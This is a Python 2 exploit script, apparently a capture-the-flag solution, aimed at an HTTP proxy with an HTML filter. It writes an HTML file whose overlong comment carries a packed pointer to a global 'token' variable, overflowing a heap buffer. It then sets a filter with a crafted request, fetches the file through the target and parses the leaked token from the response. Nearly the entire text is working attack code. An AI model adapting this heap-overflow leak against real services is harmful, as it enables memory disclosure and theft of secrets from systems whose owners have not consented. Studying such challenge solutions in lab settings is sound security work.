import sys
import socket
import os
import struct

def readuntil( s, u ):
    z = ''

    while z.endswith( u ) == False:
        z += s.recv(1)

    return z

def readline( s ):
    return readuntil( s, '\n')

def write_html( ):
    a = '''<html><body><!-- Comment-->Comment<!-- Bigger Commenteeeeeeeeffffffffgggggggghhhhhhhhaaaaaabbbccccccci'''

    ### This is the address for the global variable token
    ### This pointer overwrites the comment value in the heap buffer to print the token
    a += struct.pack('Q', 0x60c1e0)
    #a += struct.pack('Q', 0xdeadbeefcafebabe)
    a += '''bbbbbbbb--></body></html>'''

    f = open('../challenge/test_files/newovr.html', 'wb')
    f.write(a)
    f.close()

def conn( HOST, PORT ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except:
        print '[FAIL] Failed to connect to target %s:%d' %(HOST, PORT)
        sys.exit(1)


    print '[INFO] Connected to %s:%d' %(HOST, PORT)

    return s

def write_filter( HOST, PORT ):
    s = conn( HOST, PORT )

    s.send('GET /filter HTTP/1.1\r\nFilter: B cut script\r\n\r\n')

    print '[INFO] Filter set'

    s.close()


def send_request( HOST, PORT ):
    s = conn( HOST, PORT)

    s.send('GET http://127.0.0.1:8000/newovr.html HTTP/1.1\r\n\r\n')

    y = readuntil( s, '\r\n\r\n')

    d = y.split('\n')

    cl = ''

    for x in d:
        if x.find('Content-Length') != -1:
            cl = x
            break

    if cl == '':
        print '[ERROR] Failed to receive content length'
        s.close()
        sys.exit(1)

    e = cl.split(':')[1]

    f = int(e)

    print '[INFO] Content length: %d' %(f)

    content = s.recv(f)

    g = content.split('\n')

    h = g[2].lstrip().rstrip().lstrip('<').rstrip('>')

    print 'TOKEN: %s' %(h)
    s.close()

    return 1

def main( argv ):
    if len(argv) == 3:
        HOST=argv[1]
        PORT=int(argv[2])
    else:
        if 'HOST' not in os.environ or 'PORT' not in os.environ:
            print '[ERROR] target and port must be specified via arguments or variables.'
            sys.exit(1)

        HOST=os.environ['HOST']
        PORT=int(os.environ['PORT'])

    write_html()

    write_filter(HOST,PORT)
    send_request(HOST, PORT)

    sys.exit(0)

if __name__ == '__main__':
    main(sys.argv)